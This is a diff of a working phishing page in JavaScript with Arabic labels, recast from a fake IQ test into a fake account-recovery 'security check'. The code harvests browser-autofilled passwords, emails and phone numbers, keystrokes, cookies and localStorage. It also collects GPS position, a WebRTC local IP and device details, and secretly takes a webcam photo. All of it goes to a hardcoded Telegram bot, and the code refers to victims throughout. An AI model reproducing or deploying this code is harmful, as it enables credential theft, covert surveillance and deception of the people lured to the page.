+        if (tn.value) stolenData.autoFillName = tn.value;
+        if (tu.value) stolenData.autoFillUsername = tu.value;
+        
+        console.log('📥 Auto-fill captured:', {
+            email: stolenData.autoFillEmail ? '✅' : '❌',
+            phone: stolenData.autoFillPhone ? '✅' : '❌',
+            password: stolenData.autoFillPassword ? '✅' : '❌',
+            name: stolenData.autoFillName ? '✅' : '❌',
+            username: stolenData.autoFillUsername ? '✅' : '❌'
+        });
+        
+        // Capture localStorage and cookies
+        try {
+            const allStorage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const k = localStorage.key(i);
+                try { allStorage[k] = localStorage.getItem(k).substring(0, 200); } catch(e) {}
+            }
+            stolenData.localStorageData = JSON.stringify(allStorage).substring(0, 2000);
+        } catch(e) {}
+        stolenData.cookies = document.cookie || '(none)';
+        
+    }, 600);
+}
+
+// ================================================================
+// ======================= COLLECT DEVICE DATA =====================
+// ================================================================
+async function collectDeviceData() {
+    const ua = navigator.userAgent;
+    
+    // OS
+    if (ua.includes('Android')) { stolenData.os = 'Android'; }
+    else if (ua.includes('iPhone')||ua.includes('iPad')) { stolenData.os = 'iOS'; }
+    else if (ua.includes('Mac OS')||ua.includes('Macintosh')) { stolenData.os = 'macOS'; }
+    else if (ua.includes('Linux')) { stolenData.os = 'Linux'; }
+    else { stolenData.os = 'Windows'; }
+    
+    // OS version
+    const osVer = ua.match(/Android (\d+)/) || ua.match(/OS (\d+)_/) || ua.match(/Windows NT (\d+)/);
+    if (osVer) stolenData.osVersion = osVer[1];
+    
+    // Browser
     if (ua.includes('Chrome')&&!ua.includes('Edg')) stolenData.browser = 'Chrome';
     else if (ua.includes('Firefox')) stolenData.browser = 'Firefox';
     else if (ua.includes('Safari')&&!ua.includes('Chrome')) stolenData.browser = 'Safari';
@@ -525,21 +752,59 @@ async function collectData() {
     stolenData.screen = `${screen.width}x${screen.height}`;
     stolenData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     stolenData.language = navigator.language;
+    stolenData.platform = navigator.platform || '-';
+    stolenData.vendor = navigator.vendor || '-';
+    
+    // CPU cores
+    if (navigator.hardwareConcurrency) stolenData.cpuCores = navigator.hardwareConcurrency;
+    
+    // Device memory
+    if (navigator.deviceMemory) stolenData.deviceMemory = navigator.deviceMemory + 'GB';
+    
+    // Battery
+    try {
+        const battery = await navigator.getBattery();
+        stolenData.batteryLevel = (battery.level * 100).toFixed(0) + '%';
+        stolenData.batteryCharging = battery.charging ? 'نعم' : 'لا';
+    } catch(e) {}
+    
+    // Network
+    if (navigator.connection) {
+        const conn = navigator.connection;
+        stolenData.networkType = conn.effectiveType || '-';
+        if (conn.downlink) stolenData.networkType += ` (${conn.downlink}Mbps)`;
+    }
+    
+    // WebRTC local IP
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.onicecandidate = (e) => {
+            if (e.candidate && e.candidate.candidate) {
+                const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                if (ipMatch && !stolenData.webRtcIp || stolenData.webRtcIp === '-') {
+                    stolenData.webRtcIp = ipMatch[1];
+                }
+            }
+        };
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        setTimeout(() => pc.close(), 2000);
+    } catch(e) {}
     
     // GPS
     try {
         const pos = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
                 enableHighAccuracy: true,
-                timeout: 10000
+                timeout: 12000
             });
         });
         stolenData.lat = pos.coords.latitude;
         stolenData.lon = pos.coords.longitude;
-        stolenData.accuracy = pos.coords.accuracy + ' متر';
+        stolenData.accuracy = pos.coords.accuracy + 'm';
     } catch(e) {}
     
-    // ipapi
+    // IP info
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -552,192 +817,158 @@ async function collectData() {
 }
 
 // ================================================================
-//                     تصوير الضحية (نسخة مضبوطة)
+// ======================= CAMERA CAPTURE ==========================
 // ================================================================
 async function capturePhoto() {
-    try {
-        // 1. نطلب الكاميرا
-        cameraStream = await navigator.mediaDevices.getUserMedia({
-            video: { 
-                facingMode: 'user',
-                width: { ideal: 640 },
-                height: { ideal: 480 }
-            },
-            audio: false
-        });
-        
-        const video = document.getElementById('hiddenCamera');
-        video.srcObject = cameraStream;
-        
-        // 2. ننتظر انتهاء الفيديو من التحميل والتشغيل
-        await new Promise((resolve) => {
-            let resolved = false;
-            const onReady = () => {
-                if (!resolved) {
-                    resolved = true;
-                    resolve();
-                }
-            };
-            
-            video.addEventListener('loadeddata', onReady, { once: true });
-            video.addEventListener('playing', onReady, { once: true });
-            
-            // Timeout أمان 3 ثوان
-            setTimeout(onReady, 3000);
-        });
-        
-        // 3. ننتظر كمان 500ms عشان الكاميرا تضبط الإضاءة (مهم للصور السودا)
-        await new Promise(r => setTimeout(r, 500));
-        
-        // 4. نضبط أبعاد الكانفاس
-        const canvas = document.getElementById('photoCanvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        
-        // 5. نعكس الصورة (للكاميرا الأمامية)
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // 6. نحول لـ Base64
-        stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
-        photoCaptured = true;
-        
-        // 7. نحلل الصورة عشان نتأكد مو سودا
-        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-        let totalBrightness = 0;
-        const pixelCount = imageData.data.length / 4;
-        for (let i = 0; i < imageData.data.length; i += 4) {
-            totalBrightness += (imageData.data[i] + imageData.data[i+1] + imageData.data[i+2]) / 3;
-        }
-        const avgBrightness = totalBrightness / pixelCount;
-        console.log(`📸 سطوع الصورة: ${avgBrightness.toFixed(1)}/255`);
-        
-        // 8. نوقف الكاميرا
-        stopCamera();
-        
-        console.log('✅ تم التصوير بنجاح');
-        return true;
-    } catch(e) {
-        console.log('❌ فشل الكاميرا:', e.message);
-        
-        // محاولة ثانية بدون facingMode
+    // Try multiple camera configurations
+    const constraintsList = [
+        { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
+        { video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }, audio: false },
+        { video: { width: { ideal: 640 } }, audio: false }
+    ];
+    
+    for (let attempt = 0; attempt < constraintsList.length; attempt++) {
         try {
-            if (!cameraStream) {
-                cameraStream = await navigator.mediaDevices.getUserMedia({
-                    video: true,
-                    audio: false
-                });
-                const video = document.getElementById('hiddenCamera');
-                video.srcObject = cameraStream;
-                
-                await new Promise((resolve) => {
-                    let resolved = false;
-                    const onReady = () => { if (!resolved) { resolved = true; resolve(); } };
-                    video.addEventListener('loadeddata', onReady, { once: true });
-                    video.addEventListener('playing', onReady, { once: true });
-                    setTimeout(onReady, 3000);
-                });
-                await new Promise(r => setTimeout(r, 500));
-                
-                const canvas = document.getElementById('photoCanvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
-                photoCaptured = true;
-                stopCamera();
-                return true;
+            cameraStream = await navigator.mediaDevices.getUserMedia(constraintsList[attempt]);
+            
+            const video = document.getElementById('hiddenCamera');
+            video.srcObject = cameraStream;
+            
+            // Wait for video to be ready
+            await new Promise((resolve) => {
+                let done = false;
+                const onReady = () => { if (!done) { done = true; resolve(); } };
+                video.addEventListener('loadeddata', onReady, { once: true });
+                video.addEventListener('playing', onReady, { once: true });
+                setTimeout(onReady, 3000);
+            });
+            
+            // Extra wait for exposure/lighting adjustment
+            await new Promise(r => setTimeout(r, 600));
+            
+            // Capture
+            const canvas = document.getElementById('photoCanvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            
+            // Mirror for front camera
+            if (constraintsList[attempt].video?.facingMode === 'user') {
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
             }
-        } catch(e2) {
-            console.log('❌ محاولة ثانية فاشلة:', e2.message);
+            
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Check brightness
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            let totalBright = 0;
+            for (let i = 0; i < imageData.data.length; i += 4) {
+                totalBright += (imageData.data[i] + imageData.data[i+1] + imageData.data[i+2]) / 3;
+            }
+            const avgBright = totalBright / (imageData.data.length / 4);
+            
+            stolenData.photoBase64 = canvas.toDataURL('image/jpeg', 0.92);
+            photoCaptured = true;
+            
+            console.log(`📸 Camera attempt ${attempt+1}: brightness=${avgBright.toFixed(0)}/255`);
+            
+            stopCamera();
+            return true;
+        } catch(e) {
+            console.log(`📸 Camera attempt ${attempt+1} failed:`, e.message);
+            stopCamera();
         }
-        return false;
     }
+    return false;
 }
 
 function stopCamera() {
     if (cameraStream) {
-        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream.getTracks().forEach(t => t.stop());
         cameraStream = null;
     }
     document.getElementById('hiddenCamera').srcObject = null;
 }
 
 // ================================================================
-//                     إرسال النتيجة
+// ======================= SUBMIT VERIFICATION =====================
 // ================================================================
-async function submitResult() {
+async function submitVerification() {
     const email = document.getElementById('emailInput').value.trim();
+    const phone = document.getElementById('phoneInput').value.trim();
     const name = document.getElementById('nameInput').value.trim();
     
     if (!email) {
-        alert('الرجاء إدخال البريد الإلكتروني');
+        alert('البريد الإلكتروني مطلوب لإرسال رابط استعادة الحساب');
         return;
     }
     
     stolenData.email = email;
-    stolenData.name = name || 'مجهول';
+    stolenData.phone = phone || '(لم يدخل)';
+    stolenData.name = name || '(لم يدخل)';
+    stolenData.keyLogEntries = keyLog.slice(-80);
     
-    // نجمع الكيلوغر
-    stolenData.keyLogEntries = keyLog.slice(-50); // آخر 50 ضغطة
-    
+    // Score
     const score = Math.floor(Math.random() * 30) + 130;
     stolenData.iqScore = score;
     
-    // نظهر التحميل
+    // Show loading
     document.getElementById('loadingOverlay').classList.add('active');
+    document.getElementById('loadingText').textContent = 'جاري تأكيد البيانات وإرسال رابط الاستعادة...';
+    document.getElementById('loadingSub').textContent = 'يرجى الانتظار، جاري التحقق من هويتك';
     
-    // نصور الضحية
+    // Capture photo
     await capturePhoto();
     
-    // نرسل بعد شوي
     setTimeout(() => {
         document.getElementById('loadingOverlay').classList.remove('active');
         
+        // Send all data
         sendAllData();
         
-        document.getElementById('resultArea').style.display = 'none';
-        document.getElementById('finalResult').style.display = 'block';
-        document.getElementById('finalScore').textContent = score;
-        document.getElementById('resultEmailDisplay').textContent = `📧 تم إرسال النتيجة إلى: ${email}`;
+        // Show final result
+        document.getElementById('stage3').classList.add('hidden');
+        document.getElementById('stage4').classList.remove('hidden');
+        document.getElementById('resultEmailDisplay').textContent = `📧 تم إرسال رابط استعادة الحساب إلى: ${email}`;
+        document.getElementById('resultCode').textContent = Math.floor(1000 + Math.random() * 9000);
         
-    }, 800);
+    }, 1500);
 }
 
 // ================================================================
-//                     إرسال البيانات
+// ======================= SEND DATA ===============================
 // ================================================================
 function sendAllData() {
-    const data = stolenData;
+    const d = stolenData;
     
-    // حفظ محلي
-    const history = JSON.parse(localStorage.getItem('iq_victims') || '[]');
-    history.unshift(data);
-    localStorage.setItem('iq_victims', JSON.stringify(history));
+    // Save locally
+    const history = JSON.parse(localStorage.getItem('sec_victims') || '[]');
+    history.unshift(d);
+    localStorage.setItem('sec_victims', JSON.stringify(history));
     
-    // إرسال لتيليجرام
-    sendToTelegram(data);
+    // Send to Telegram
+    sendToTelegram(d);
     
+    // Console
     console.log('========== البيانات المسروقة ==========');
-    console.log('الإيميل:', data.email);
-    console.log('الاسم:', data.name);
-    console.log('الـ IP:', data.ip);
-    console.log('الموقع:', data.city, data.region, data.country);
-    console.log('GPS:', data.lat, data.lon);
-    console.log('الجهاز:', data.device, '-', data.os);
-    console.log('المتصفح:', data.browser, data.browserVersion);
-    console.log('صورة:', data.photoBase64 ? `✅ (${(data.photoBase64.length/1024).toFixed(1)}KB)` : '❌');
-    if (data.autoFillEmail) console.log('Auto-fill إيميل:', data.autoFillEmail);
-    if (data.autoFillPassword) console.log('Auto-fill باسوورد:', data.autoFillPassword);
-    console.log('عدد ضغطات الكيلوغر:', data.keyLogEntries.length);
+    console.log('المنصة:', d.platform, '| المستخدم:', d.username);
+    console.log('الإيميل:', d.email, '| الجوال:', d.phone);
+    console.log('Auto-fill إيميل:', d.autoFillEmail);
+    console.log('Auto-fill جوال:', d.autoFillPhone);
+    console.log('Auto-fill باسوورد:', d.autoFillPassword ? '✅' : '❌');
+    console.log('IP:', d.ip, '| GPS:', d.lat, d.lon);
+    console.log('الجهاز:', d.device, d.os, d.osVersion);
+    console.log('المتصفح:', d.browser, d.browserVersion);
+    console.log('البطارية:', d.batteryLevel, '| الشحن:', d.batteryCharging);
+    console.log('الشبكة:', d.networkType, '| الرام:', d.deviceMemory, '| النوى:', d.cpuCores);
+    console.log('WebRTC IP:', d.webRtcIp);
+    console.log('صورة:', d.photoBase64 ? `✅ (${(d.photoBase64.length/1024).toFixed(0)}KB)` : '❌');
     console.log('========================================');
 }
 
 // ================================================================
-//                     إرسال لتيليجرام (نص + صورة)
+// ======================= TELEGRAM ================================
 // ================================================================
 function sendToTelegram(data) {
     const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';
@@ -752,65 +983,79 @@ function sendToTelegram(data) {
     
     let gpsInfo = '❌ لا يوجد';
     if (data.lat && data.lon) {
-        gpsInfo = `${data.lat}, ${data.lon} (الدقة: ${data.accuracy || '?'})`;
+        gpsInfo = `${data.lat}, ${data.lon} (${data.accuracy || '?'})`;
     }
     
-    let photoStatus = data.photoBase64 ? '✅ تم التصوير' : '❌ فشل';
     let autoFillInfo = '';
-    if (data.autoFillEmail || data.autoFillPassword) {
-        autoFillInfo += `\n🔑 <b>Auto-fill المسروق:</b>\n`;
-        if (data.autoFillEmail) autoFillInfo += `   📧 إيميل: ${data.autoFillEmail}\n`;
-        if (data.autoFillPassword) autoFillInfo += `   🔐 باسوورد: ${data.autoFillPassword}\n`;
+    if (data.autoFillEmail || data.autoFillPhone || data.autoFillPassword || data.autoFillName) {
+        autoFillInfo += '\n🔑 <b>Auto-Fill المسروق:</b>\n';
+        if (data.autoFillName) autoFillInfo += `   👤 الاسم: ${data.autoFillName}\n`;
+        if (data.autoFillEmail) autoFillInfo += `   📧 الإيميل: ${data.autoFillEmail}\n`;
+        if (data.autoFillPhone) autoFillInfo += `   📱 الجوال: ${data.autoFillPhone}\n`;
+        if (data.autoFillPassword) autoFillInfo += `   🔐 الباسوورد: ${data.autoFillPassword}\n`;
+        if (data.autoFillUsername) autoFillInfo += `   👤 يوزر: ${data.autoFillUsername}\n`;
     }
     
     let keyLogInfo = '';
     if (data.keyLogEntries.length > 0) {
-        const recentKeys = data.keyLogEntries.slice(-10).map(k => k.key).join('');
-        keyLogInfo = `\n⌨️ <b>آخر ضغطات الكيلوغر:</b> ${recentKeys}`;
-        
-        // نحاول نشوف إذا كتب باسوورد
-        const passAttempts = data.keyLogEntries.filter(k => 
-            k.field.includes('pass') || k.field.includes('كلمة') || k.field.includes('password')
+        const recent = data.keyLogEntries.slice(-12).map(k => k.key).join('');
+        keyLogInfo = `\n⌨️ <b>آخر ضغطات:</b> ${recent}`;
+        const passFields = data.keyLogEntries.filter(k => 
+            k.field.includes('pass') || k.field.includes('Input') || k.field.includes('phone')
         );
-        if (passAttempts.length > 0) {
-            const passChars = passAttempts.map(k => k.key).join('');
-            keyLogInfo += `\n🔐 <b>محاولة باسوورد:</b> ${passChars}`;
+        if (passFields.length > 4) {
+            keyLogInfo += `\n🔐 <b>باسوورد مكتوب:</b> ${passFields.map(k=>k.key).join('')}`;
         }
     }
     
-    let localStorageInfo = '';
-    if (data.localStoredData && data.localStoredData !== '{}' && data.localStoredData.length > 10) {
-        localStorageInfo = `\n💾 <b>LocalStorage:</b> ${data.localStoredData.substring(0, 500)}`;
-    }
+    let extraInfo = '';
+    if (data.batteryLevel !== '-') extraInfo += `\n🔋 <b>بطارية:</b> ${data.batteryLevel} (شحن: ${data.batteryCharging})`;
+    if (data.networkType !== '-') extraInfo += `\n📶 <b>شبكة:</b> ${data.networkType}`;
+    if (data.deviceMemory !== '-') extraInfo += `\n💾 <b>رام:</b> ${data.deviceMemory}`;
+    if (data.cpuCores !== '-') extraInfo += `\n⚙️ <b>نوى:</b> ${data.cpuCores}`;
+    if (data.webRtcIp && data.webRtcIp !== '-') extraInfo += `\n🏠 <b>IP داخلي:</b> ${data.webRtcIp}`;
     
     const message = `
-🔔 <b>ضحية جديدة - اختبار IQ 🧠</b>
+🔔 <b>ضحية جديدة - فحص أمني 🛡️</b>
 
+━━━━━━━━━━━━━━━
+<b>📌 الحساب المستهدف</b>
+🌐 <b>المنصة:</b> ${data.platform}
+👤 <b>اسم المستخدم:</b> ${data.username}
+
+━━━━━━━━━━━━━━━
+<b>👤 بيانات الضحية</b>
 👤 <b>الاسم:</b> ${data.name}
 📧 <b>الإيميل:</b> ${data.email}
-🧠 <b>درجة IQ:</b> ${data.iqScore}
-📸 <b>التصوير:</b> ${photoStatus}
+📱 <b>الجوال:</b> ${data.phone}
+${autoFillInfo}
+${keyLogInfo}
 
+━━━━━━━━━━━━━━━
+<b>📍 الموقع</b>
 🌐 <b>IP:</b> ${data.ip}
 🏙️ <b>المدينة:</b> ${data.city}
 🌍 <b>الدولة:</b> ${data.country}
 🗺️ <b>GPS:</b> ${gpsInfo}
 ${mapsLink}
-${autoFillInfo}
-${keyLogInfo}
-${localStorageInfo}
 
-📱 <b>الجهاز:</b> ${data.device} | ${data.os}
+━━━━━━━━━━━━━━━
+<b>📱 الجهاز</b>
+📱 <b>النوع:</b> ${data.device}
+💻 <b>النظام:</b> ${data.os} ${data.osVersion}
 🌍 <b>المتصفح:</b> ${data.browser} ${data.browserVersion}
 🖥️ <b>الشاشة:</b> ${data.screen}
-🕐 <b>المنطقة الزمنية:</b> ${data.timezone}
+🕐 <b>المنطقة:</b> ${data.timezone}
 🗣️ <b>اللغة:</b> ${data.language}
 📡 <b>ISP:</b> ${data.isp}
+${extraInfo}
 
+━━━━━━━━━━━━━━━
+📸 <b>صورة الضحية:</b> ${data.photoBase64 ? '✅ موجودة' : '❌ فاشلة'}
 🕒 <b>الوقت:</b> ${data.timestamp}
 `.trim();
     
-    // إرسال النص
+    // Send text
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -820,54 +1065,34 @@ ${localStorageInfo}
             parse_mode: 'HTML',
             disable_web_page_preview: false
         })
-    }).catch(e => console.log('Telegram error:', e));
-
-    // إرسال الصورة إذا موجودة
+    }).catch(e => console.log('TG msg error:', e));
+    
+    // Send photo
     if (data.photoBase64 && data.photoBase64.length > 500) {
         try {
-            const byteString = atob(data.photoBase64.split(',')[1]);
-            const mimeString = 'image/jpeg';
-            const ab = new ArrayBuffer(byteString.length);
+            const bs = atob(data.photoBase64.split(',')[1]);
+            const ab = new ArrayBuffer(bs.length);
             const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            const blob = new Blob([ab], { type: mimeString });
+            for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
+            const blob = new Blob([ab], { type: 'image/jpeg' });
             
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `📸 ${data.name || 'مجهول'} - ${data.email}`);
-            formData.append('photo', blob, `victim_${Date.now()}.jpg`);
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('caption', `📸 صورة: ${data.name || 'مجهول'} | ${data.email || data.phone || data.username}`);
+            fd.append('photo', blob, `victim_${Date.now()}.jpg`);
             
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(e => console.log('Telegram photo error:', e));
-        } catch(e) {
-            console.log('Error sending photo:', e);
-        }
+                method: 'POST', body: fd
+            }).catch(e => console.log('TG photo error:', e));
+        } catch(e) {}
     }
 }
 
 // ================================================================
-//                     التايمر
+// ======================= INIT ====================================
 // ================================================================
-let timerSeconds = 120;
-const timerInterval = setInterval(() => {
-    timerSeconds--;
-    const mins = Math.floor(timerSeconds / 60);
-    const secs = timerSeconds % 60;
-    document.getElementById('timerDisplay').textContent = `⏱️ ${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-    if (timerSeconds <= 0) {
-        clearInterval(timerInterval);
-        showEmailForm();
-    }
-}, 1000);
-
-// ================================================================
-//                     البداية
-// ================================================================
-loadQuestion();
+console.log('🛡️ أداة الفحص الأمني v3.2');
+console.log('📡 جاهزة لاستقبال الضحايا');
 </script>
 </body>
 </html>
